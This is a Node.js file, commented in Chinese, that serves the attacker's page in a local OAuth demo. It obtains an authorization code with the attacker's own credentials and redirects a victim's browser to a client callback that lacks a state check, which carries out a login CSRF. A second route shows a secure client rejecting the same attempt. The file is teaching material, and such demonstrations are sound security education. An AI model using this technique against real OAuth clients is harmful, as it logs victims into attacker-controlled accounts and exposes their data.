/**
 * Demo7 - attacker.js（攻击者 Eve 的页面，端口 3002）
 *
 * 登录 CSRF 攻击流程：
 *   1. /prepare：Eve 用自己的账号(eve/666666)向授权服务器索取一个真实授权码
 *   2. /attack-vuln：诱导受害者的浏览器访问 漏洞版客户端 /callback?code=EVE的码（无state）
 *   3. /attack-secure：同样手法打安全版客户端 —— 会被 state 校验拦下
 */
const http = require('http');

const PORT = 3002;
const AUTH = 'http://localhost:9000';

function page(title, body) {
  return `<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><title>${title}</title>
<style>body{font-family:sans-serif;max-width:640px;margin:40px auto;padding:0 16px}
a.atk{display:inline-block;background:#900;color:#fff;padding:10px 18px;border-radius:4px;text-decoration:none;margin:8px 0}
pre{background:#f4f4f4;padding:12px;border-radius:6px}.tip{color:#888;font-size:14px}</style>
</head><body><h1>${title}</h1>${body}</body></html>`;
}

// Eve 用自己账号换取真实授权码（模拟"攻击者自己也走了一遍正常授权"）
async function prepare() {
  const r = await fetch(`${AUTH}/authorize/grant`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      client_id: 'web-app',
      redirect_uri: 'http://localhost:3000/callback',
      username: 'eve',
      password: '666666',
    }).toString(),
    redirect: 'manual',
  });
  const loc = r.headers.get('location') || '';
  return new URL(loc).searchParams.get('code');
}

function createServer() {
  return http.createServer(async (req, res) => {
    const url = new URL(req.url, `http://localhost:${PORT}`);
    res.setHeader('Content-Type', 'text/html; charset=utf-8');

    if (url.pathname === '/prepare') {
      const code = await prepare();
      return res.end(page('Eve 的攻击页面',
        `<p>已用 Eve 自己的账号拿到真实授权码：</p><pre>code = ${code}</pre>
         <p>现在把这个"带毒"的链接发给受害者：</p>
         <a class="atk" href="/attack-vuln?code=${code}">攻击 → 漏洞版客户端(3000)</a><br>
         <a class="atk" href="/attack-secure?code=${code}">攻击 → 安全版客户端(3001)</a>`));
    }

    if (url.pathname === '/attack-vuln') {
      res.statusCode = 302;
      res.setHeader('Location', `http://localhost:3000/callback?code=${url.searchParams.get('code')}`);
      return res.end();
    }

    if (url.pathname === '/attack-secure') {
      res.statusCode = 302;
      res.setHeader('Location', `http://localhost:3001/callback?code=${url.searchParams.get('code')}`);
      return res.end();
    }

    res.end(page('Eve 的攻击页面',
      `<p>我是攻击者 Eve。点击按钮我会先用自己的账号拿一个真实授权码，</p>
       <p>然后把受害者（你）重定向到客户端回调地址，附上我的授权码 —— 这就是登录 CSRF。</p>
       <a class="atk" href="/prepare">开始准备攻击</a>
       <p class="tip">真实世界里，"点击"发生在论坛帖子、钓鱼邮件或恶意网页里。</p>`));
  });
}

function start() {
  createServer().listen(PORT, () => console.log(`攻击者页面: http://localhost:${PORT}`));
}

module.exports = { start };
if (require.main === module) start();
